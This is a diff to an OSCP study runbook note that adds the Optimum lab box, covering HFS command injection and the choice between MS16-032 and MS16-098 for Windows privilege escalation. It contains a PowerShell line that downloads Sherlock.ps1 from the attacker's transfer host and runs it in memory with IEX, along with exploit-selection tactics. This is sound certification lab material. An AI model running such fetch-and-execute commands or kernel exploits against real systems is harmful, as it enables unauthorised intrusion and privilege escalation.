@@ -108,12 +108,25 @@ Run WinPEAS if the manual output does not expose the path:
 - [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- Drupal RCE, token privilege triage, and impersonation
 - [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- IPSec gate, FTP upload, and JuicyPotato
 - [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- XML source disclosure and Windows privilege escalation
+- [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] -- HFS command injection, native callback, Sherlock triage, and processor-aware MS16-098
 
 ## Search pattern
 
 If ordinary WinRM is absent but an IIS client-certificate route exists, use the certificate-authenticated PSWA page as the Windows shell branch. In the browser, preserve the stateful form and target node; once connected, run whoami, hostname, whoami /groups, and whoami /priv before routing back to AD ACL or gMSA triage.
 
 See [[OSCP/BOXES/WRITE UPS/AD/Search|Search]] and [[OSCP/RUNBOOK V2/AD - PowerShell Web Access|AD - PowerShell Web Access]].
+
+## Optimum local escalation pattern
+
+After the HFS callback lands, run `systeminfo` before selecting a kernel exploit. Sherlock is useful for producing candidates, but the implementation's runtime prerequisites still decide whether a result is usable. In the Optimum route, the one-processor result ruled out MS16-032 even though Sherlock reported it as appearing vulnerable. The reviewed MS16-098 `bfill.exe` binary succeeded only after it was launched from the clean native callback rather than the HFS worker context.
+
+~~~powershell
+systeminfo
+IEX (New-Object Net.WebClient).DownloadString('http://$LocalIP:$TransferPort/Sherlock.ps1')
+Find-AllVulns
+~~~
+
+If the host has one processor, do not keep retrying the MS16-032 implementation. Compare the exact OS, architecture, build, patches, CPU count, token, and shell context before choosing the next candidate. See [[OSCP/RUNBOOK V2/Windows - Privilege Triage|Windows Privilege Triage]], [[OSCP/DECISION TREE/Windows Privilege Escalation (Decision Tree)|Windows Privilege Escalation Decision Tree]], and [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]].
 
 ## Detailed routes
 
